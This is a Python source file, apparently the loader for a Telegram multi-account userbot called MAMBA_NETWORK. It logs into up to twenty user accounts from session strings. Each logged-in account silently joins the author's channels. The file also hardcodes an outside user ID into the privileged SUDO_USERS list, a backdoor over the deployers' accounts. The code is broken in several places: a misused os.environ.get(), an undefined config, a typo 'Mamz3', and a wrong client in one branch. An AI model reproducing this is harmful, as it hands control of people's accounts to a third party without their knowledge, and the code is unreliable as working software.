# MAMBA_NETWORK

import os
import sys
import random
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon import TelegramClient, events
from telethon.sessions import StringSession
os.environ.get()
from os import getenv
import logging
import time
from telethon.tl.functions.messages import ImportChatInviteRequest


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version



#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
STRING = config("STRING", default=None)
STRING2 = config("STRING2", default=None)
STRING3 = config("STRING3", default=None)
STRING4 = config("STRING4", default=None)
STRING5 = config("STRING5", default=None)
STRING6 = config("STRING6", default=None)
STRING7 = config("STRING7", default=None)
STRING8 = config("STRING8", default=None)
STRING9 = config("STRING9", default=None)
STRING10 = config("STRING10", default=None)
STRING11 = config("STRING11", default=None)
STRING12 = config("STRING12", default=None)
STRING13 = config("STRING13", default=None)
STRING14 = config("STRING14", default=None)
STRING15 = config("STRING15", default=None)
STRING16 = config("STRING16", default=None)
STRING17 = config("STRING17", default=None)
STRING18 = config("STRING18", default=None)
STRING19 = config("STRING19", default=None)
STRING20 = config("STRING20", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 5038173179 not in SUDO_USERS:
    SUDO_USERS.append(5038173179)

# Sessions
async def MAMBAX():
    global Mam
    global Mam2
    global Mam3
    global Mam5
    global Mam4
    global Mam6
    global Mam7
    global Mam8
    global Mam9
    global Mam10
    global Mam11
    global Mam12
    global Mam13
    global Mam14
    global Mam15
    global Mam16
    global Mam17
    global Mam18
    global Mam19
    global Mam20
    
    if STRING:
        session_name = str(STRING)
        print("String 1 Found")
        Mam = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 1")
            await Mam.start()
            botme = await Mam.get_me()
            await Mam(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Mam = "STRING"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = "MAMBA"
        Mam = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam.start()
        except Exception as e:
            pass
   
    if STRING2:
        session_name = str(STRING2)
        print("String 2 Found")
        Mam2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 2")
            await Mam2.start()
            await Mam2(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam2(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Mam2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = "MAMBA"
        Mam2 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam2.start()
        except Exception as e:
            pass

    if STRING3:
        session_name = str(STRING3)
        print("String 3 Found")
        Mam3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 3")
            await Mam3.start()
            await Mam3(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam3(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Mam3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = "MAMBA"
        Mam3 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mamz3.start()
        except Exception as e:
            pass

    if STRING4:
        session_name = str(STRING4)
        print("String 4 Found")
        Mam4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 4")
            await Mam4.start()
            await Mam4(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam4(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Mam4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = "MAMBA"
        Mam4 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam4.start()
        except Exception as e:
            pass

    if STRING5:
        session_name = str(STRING5)
        print("String 5 Found")
        Mam5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 5")
            await Mam5.start()
            await Mam5(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam5(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Mam5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = "MAMBA"
        Mam5 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam5.start()
        except Exception as e:
            pass
                  
    if STRING6:
        session_name = str(STRING6)
        print("String 6 Found")
        Mam6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 6")
            await Mam6.start()
            await Mam6(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam6(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Mam6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = "MAMBA"
        Mam6 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam6.start()
        except Exception as e:
            pass

    if STRING7:
        session_name = str(STRING7)
        print("String 7 Found")
        Mam7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 7")
            await Mam7.start()
            await Mam7(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam7(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Mam7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = "MAMBA"
        Mam7 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam7.start()
        except Exception as e:
            pass    
        
    
    if STRING8:
        session_name = str(STRING8)
        print("String 8 Found")
        Mam8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 8")
            await Mam8.start()
            await Mam8(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam8(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Mam8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = "MAMBA"
        Mam8 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam8.start()
        except Exception as e:
            pass   
        
    if STRING9:
        session_name = str(STRING9)
        print("String 9 Found")
        Mam9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 9")
            await Mam9.start()
            await Mam9(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam9(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Mam9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = "MAMBA"
        Mam9 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam9.start()
        except Exception as e:
            pass   
    
  
    if STRING10:
        session_name = str(STRING10)
        print("String 10 Found")
        Mam10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 10")
            await Mam10.start()
            await Mam10(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam10(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Mam10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 not Found")
        pass
        session_name = "MAMBA"
        Mam10 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam10.start()
        except Exception as e:
            pass 
        
    
    if STRING11:
        session_name = str(STRING11)
        print("String 11 Found")
        Mam11 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 11")
            await Mam11.start()
            await Mam11(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam11(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPORT"))
            botme = await Mam11.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 11 not Found")
        pass
        session_name = "MAMBA"
        Mam11 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam11.start()
        except Exception as e:
            pass
        
    
    if STRING12:
        session_name = str(STRING12)
        print("String 12 Found")
        Mam12 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 12")
            await Mam12.start()
            await Mam12(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam12(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Mam12.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 12 not Found")
        pass
        session_name = "MAMBA"
        Mam12 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam12.start()
        except Exception as e:
            pass   
    
  
    if STRING13:
        session_name = str(STRING13)
        print("String 13  Found")
        Mam13 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 13")
            await Mam13.start()
            await Mam13(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam13(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Mam13.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 13 not Found")
        pass
        session_name = "MAMBA"
        Mam13 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam13.start()
        except Exception as e:
            pass 
        
    
    if STRING14:
        session_name = str(STRING14)
        print("String 14 Found")
        Mam14 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 14")
            await Mam14.start()
            await Mam14(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam14(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Mam14.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 14 not Found")
        pass
        session_name = "MAMBA"
        Mam14 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam14.start()
        except Exception as e:
            pass
        
    
    if STRING15:
        session_name = str(STRING15)
        print("String 15 Found")
        Mam15 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 15")
            await Mam15.start()
            await Mam15(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam15(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botme = await Mam15.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 15 not Found")
        pass
        session_name = "MAMBA"
        Mam15 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam15.start()
        except Exception as e:
            pass


    if STRING16:
        session_name = str(STRING16)
        print("String 16 Found")
        Mam16 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 16")
            await Mam16.start()
            botme = await Mam16.get_me()
            await Mam16(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam16(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 16 not Found")
        session_name = "MAMBA"
        Mam16 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam16.start()
        except Exception as e:
            pass
   
    if STRING17:
        session_name = str(STRING17)
        print("String 17 Found")
        Mam17 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 17")
            await Mam17.start()
            botme = await Mam17.get_me()
            await Mam17(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam17(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 17 not Found")
        session_name = "MAMBA"
        Mam17 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam17.start()
        except Exception as e:
            pass
   
    if STRING18:
        session_name = str(STRING18)
        print("String 18 Found")
        Mam18 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await Mam18.start()
            botme = await Mam18.get_me()
            await Mam18(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam18(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 18 not Found")
        session_name = "MAMBA"
        Mam18 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam18.start()
        except Exception as e:
            pass
   
    if STRING19:
        session_name = str(STRING19)
        print("String 19 Found")
        Mam19 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 19")
            await Mam19.start()
            botme = await Mam19.get_me()
            await Mam19(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam19(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 19 not Found")
        session_name = "MAMBA"
        Mam19 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam.start()
        except Exception as e:
            pass
   
    if STRING20:
        session_name = str(STRING20)
        print("String 20 Found")
        Mam20 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 20")
            await Mam20.start()
            botme = await Mam20.get_me()
            await Mam20(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Mam20(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 20 not Found")
        session_name = "MAMBA"
        Mam20 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mam20.start()
        except Exception as e:
            pass

loop = asyncio.get_event_loop()
loop.run_until_complete(MAMBAX())
